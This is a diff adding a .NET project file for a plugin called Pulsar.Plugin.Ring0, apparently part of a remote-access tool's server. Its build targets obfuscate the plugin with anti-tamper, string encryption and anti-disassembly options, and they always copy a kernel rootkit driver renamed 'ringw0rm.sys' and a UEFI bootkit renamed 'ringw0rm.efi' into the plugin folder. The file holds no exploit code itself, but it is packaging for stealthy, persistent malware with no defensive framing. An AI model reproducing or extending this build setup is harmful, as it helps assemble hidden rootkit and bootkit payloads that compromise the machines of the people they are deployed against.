@@ -1,0 +1,43 @@
+<Project Sdk="Microsoft.NET.Sdk">
+  <PropertyGroup>
+    <TargetFramework>net9.0-windows</TargetFramework>
+    <UseWindowsForms>true</UseWindowsForms>
+    <UseWPF>true</UseWPF>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+    <Configurations>Debug;Release;CustomerDebug</Configurations>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)'=='Debug'">
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)'=='Release'">
+    <Optimize>true</Optimize>
+  </PropertyGroup>
+  <!-- CustomerDebug: Same protections as Release, used for customer troubleshooting -->
+  <PropertyGroup Condition="'$(Configuration)'=='CustomerDebug'">
+    <DefineConstants>CUSTOMER_DEBUG;TRACE</DefineConstants>
+    <Optimize>true</Optimize>
+  </PropertyGroup>
+  <ItemGroup>
+    <ProjectReference Include="..\Pulsar.Plugin.Ring0.Common\Pulsar.Plugin.Ring0.Common.csproj" />
+    <ProjectReference Include="..\PulsarSDK\Pulsar.Server\Pulsar.Server.csproj" />
+  </ItemGroup>
+  <ItemGroup>
+    <PackageReference Include="MessagePack" Version="3.1.4" />
+  </ItemGroup>
+  <!-- Obfuscate with .NET Reactor then copy to plugins -->
+  <Target Name="ObfuscateAndCopy" AfterTargets="Build" Condition="'$(Configuration)'=='Release'">
+    <MakeDir Directories="$(ProjectDir)..\plugins" />
+    <Exec Command="&quot;$(ProjectDir)..\Obfuscator\dotNET_Reactor.Console.exe&quot; -file &quot;$(TargetPath)&quot; -targetfile &quot;$(ProjectDir)..\plugins\$(TargetFileName)&quot; -q -antitamp 1 -control_flow 1 -flow_level 5 -stringencryption 1 -obfuscation 1 -suppressildasm 1" />
+    <Message Text="Obfuscated: $(TargetFileName)" Importance="high" />
+  </Target>
+  <Target Name="CopyToPlugins" AfterTargets="Build" Condition="'$(Configuration)'=='Debug'">
+    <MakeDir Directories="$(ProjectDir)..\plugins" />
+    <Copy SourceFiles="$(TargetPath)" DestinationFolder="$(ProjectDir)..\plugins" />
+    <Copy SourceFiles="$(TargetDir)Pulsar.Plugin.Ring0.Common.dll" DestinationFolder="$(ProjectDir)..\plugins" />
+  </Target>
+  <!-- Always copy driver and bootkit to plugins folder -->
+  <Target Name="CopyDriverFiles" AfterTargets="Build">
+    <Copy SourceFiles="$(ProjectDir)..\Chaos-Rootkit-Driver\x64\Release\ringw0rm.sys" DestinationFiles="$(ProjectDir)..\plugins\ringw0rm.sys" SkipUnchangedFiles="true" />
+    <Copy SourceFiles="$(ProjectDir)..\Elysium\Bootkit\x64\Release\Bootkit.efi" DestinationFiles="$(ProjectDir)..\plugins\ringw0rm.efi" SkipUnchangedFiles="true" Condition="Exists('$(ProjectDir)..\Elysium\Bootkit\x64\Release\Bootkit.efi')" />
+  </Target>
+</Project>
